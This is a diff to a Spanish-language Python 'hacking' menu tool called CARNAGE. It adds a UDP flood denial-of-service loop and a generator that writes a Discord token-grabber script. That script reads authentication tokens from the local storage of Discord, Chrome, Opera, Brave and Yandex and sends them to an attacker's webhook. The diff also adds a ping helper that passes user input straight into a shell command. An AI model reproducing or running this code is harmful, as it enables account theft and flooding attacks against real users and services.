@@ -1,12 +1,22 @@
 import random
-from re import VERBOSE
 import socket
 import os
 import webbrowser
 import requests
 import json
-import scapy.all as scapy
+import sys
+import time
 
+try:
+    import scapy.all as scapy
+except:
+    os.system("pip install scapy")
+    import scapy.all as scapy
+
+from subprocess import PIPE, Popen
+from datetime import datetime
+
+from re import VERBOSE
 from colorama import Fore
 from colorama import Style
 
@@ -22,7 +32,7 @@ print(f'''{Fore.RED}
         ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝      
 
-                    Creado por TeoUwUxd | Versión v0.2.5
+                    Creado por TeoUwUxd | Versión v0.3
 
         
         [ 1 ] Generar IPv4 Falsa
@@ -31,6 +41,10 @@ print(f'''{Fore.RED}
         [ 4 ] Escanear la red wifi
         [ 5 ] Listas de proxies
         [ 6 ] Conectarse a un proxy
+        [ 7 ] Pingear
+        [ 8 ] Generar perfil falso
+        [ 9 ] Hacer ataque Dos
+        [ 10 ] Discord Token Grabber
 
         [ 99 ] Cerrar la terminal
 
@@ -73,7 +87,7 @@ def IPLOGGER():
         ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  
 
-                    Creado por TeoUwUxd | Versión v0.2.5
+                    Creado por TeoUwUxd | Versión v0.3
 
 
         [ 1 ] IPLogger.org
@@ -142,7 +156,7 @@ def GEOIP():
         ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  
 
-                    Creado por TeoUwUxd | Versión v0.2.5
+                    Creado por TeoUwUxd | Versión v0.3
 
 
         [ 1 ] Geolocalizar IP
@@ -187,12 +201,11 @@ def GEOIP():
 
     elif opcionGIP == 2:
 
-        print("")
-        ipgipdns = str(input("  [~] IP: "))
+        ipgipdns = str(input(f"{Fore.RED}\n  [~] IP: {Fore.RESET}"))
         try:
             domain_name = socket.gethostbyaddr(ipgipdns)[0]
 
-            print("  " + domain_name)
+            print(f"{Fore.RED}\n      Reverse DNS IP: {Fore.RESET}" + domain_name)
             print("")
             print(f"{Fore.GREEN}  [+] Reverse DNS IP conseguida correctamente! {Style.RESET_ALL}")
 
@@ -230,7 +243,7 @@ def L_PROXIES():
         ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  
 
-                    Creado por TeoUwUxd | Versión v0.2.5
+                    Creado por TeoUwUxd | Versión v0.3
 
 
         [ 1 ] Free-Proxy-List
@@ -284,6 +297,169 @@ def VPN():
     except:
         print(f"{Fore.RED}\n  [-] No se ha podido conectar correctamente!")
 
+def PING():
+    ip = input(f"{Fore.RED}\n  [~] IP: {Fore.RESET}")
+    num = input(f"{Fore.RED}\n  [~] Número de pings: {Fore.RESET}")
+    print(f"{Fore.RED}")
+
+    def cmdline(command):
+        process = Popen(
+            args=command,
+            stdout=PIPE,
+            shell=True
+        )
+        return process.communicate()[0]
+
+    print(cmdline(f"ping -n {num} {ip}"))
+    print("-" * 168)
+    print(" ")
+
+def FAKE_INFO():
+    try:
+        url = ['https://www.fakenamegenerator.com/gen-random-sp-sp.php']
+
+        webbrowser.register('chrome',None,webbrowser.BackgroundBrowser("C://Program Files//Google//Chrome//Application//chrome.exe"))
+
+        h = webbrowser.get('chrome')
+        h.open(url[0])
+
+        print(f"{Fore.GREEN}\n  [+] La página web se ha podido abrir correctamente! {Style.RESET_ALL}\n")
+        
+    except:
+        print(f"{Fore.RED}\n  [-] Ha ocurrido un error y no se ha podido abrir la página web correctamente! {Style.RESET_ALL}\n")
+
+def DOS():
+    now = datetime.now()
+    hour = now.hour
+    minute = now.minute
+    day = now.day
+    month = now.month
+    year = now.year
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+
+    ip = str(input(f"{Fore.RED}\n  [~] IP: {Fore.RESET}"))
+    port = int(input(f"{Fore.RED}\n  [~] Puerto (53, 65, 80, 8080, etc.): {Fore.RESET}"))
+
+    print(f"{Fore.GREEN}\n     [+]--                                                                               [+] 0%")
+    time.sleep(2)
+    print("     [+]-xxxxxxxxxxxxxxxxxxxxxx>                                                         [+] 25%")
+    time.sleep(2)
+    print("     [+]-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>                                     [+] 50%")
+    time.sleep(2)
+    print("     [+]-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>                     [+] 75%")
+    time.sleep(2)
+    print("     [+]-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>[+] 100%")
+    time.sleep(2)
+    sent = 0
+    while True:
+        sock.sendto(bytes, (str(ip),int(port)))
+        sent = sent + 1
+        port = port + 1
+        print(f"{Fore.GREEN}\n  [+] Enviado el paquete {sent} a {ip} a través del puerto {port}")
+        if port == 65534:
+            port = port - 1
+
+def DISC_TOKEN():
+
+    print(f"{Fore.YELLOW}\n  [!] En la misma carpeta donde se encuentra este script, se creará un scrip llamado Discord_token_grabber_CARNAGE.py.\n      Si este ya existe, será remplazado!")
+    weebhook = input(f"{Fore.RED}\n  [~] Inserta la WEEBHOOK: {Fore.RESET}")
+    ping = input(f"{Fore.RED}\n  [~] Deseas ser pingueado? (s/n): {Fore.RESET}")
+
+    if ping == "s":
+        PING = "True"
+
+    elif ping == "n":
+        PING = "False"
+
+    elif ping != "s":
+        if ping != "n":
+            print(f"{Fore.RED}\n  [-] No se ha contestado correctamente! ")
+            exit()
+
+    file = open("Discord_token_grabber_CARNAGE.py","w")
+    file.write(f'''
+import os
+import re
+import json
+
+from urllib.request import Request, urlopen
+
+# your webhook URL
+WEBHOOK_URL = '{weebhook}'
+
+# mentions you when you get a hit
+PING_ME = {PING}
+
+    ''' + '''
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        "Discord"           : roaming + "\\Discord",
+        "Discord Canary"    : roaming + "\\discordcanary",
+        "Discord PTB"       : roaming + "\\discordptb",
+        "Google Chrome"     : local + "\\Google\\Chrome\\User Data\\Default",
+        "Opera"             : roaming + "\\Opera Software\\Opera Stable",
+        "Brave"             : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        "Yandex"            : local + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'**{platform}**```'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}'
+        else:
+            message += 'No tokens found.'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+if __name__ == '__main__':
+    main()
+
+     ''')
+    file.close
+
+    print(f"{Fore.GREEN}\n  [+] Se ha creado el nuevo Discord Toker Grabber correctamente!")
 
 
 if opcion == 1:
@@ -304,9 +480,20 @@ elif opcion == 5:
 elif opcion == 6:
     VPN()
 
+elif opcion == 7:
+    PING()
+
+elif opcion == 8:
+    FAKE_INFO()
+
+elif opcion == 9:
+    DOS()
+
+elif opcion == 10:
+    DISC_TOKEN()
+
 elif opcion == 99:
     print(f"{Style.RESET_ALL}")
     exit()
-
 
 
